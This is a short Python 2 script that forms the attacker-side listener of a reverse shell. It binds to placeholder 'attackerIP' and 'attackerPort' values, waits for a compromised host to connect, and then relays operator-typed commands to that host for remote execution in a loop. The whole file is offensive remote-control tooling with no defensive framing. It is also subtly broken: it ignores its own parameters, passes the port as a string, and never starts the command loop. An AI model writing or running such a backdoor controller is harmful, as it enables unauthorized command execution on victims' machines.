#!/usr/bin/env python
import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("attackerIP", "attackerPort"))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remote_command(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)
    
    def run_command(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remote_command(command)
            print(result)








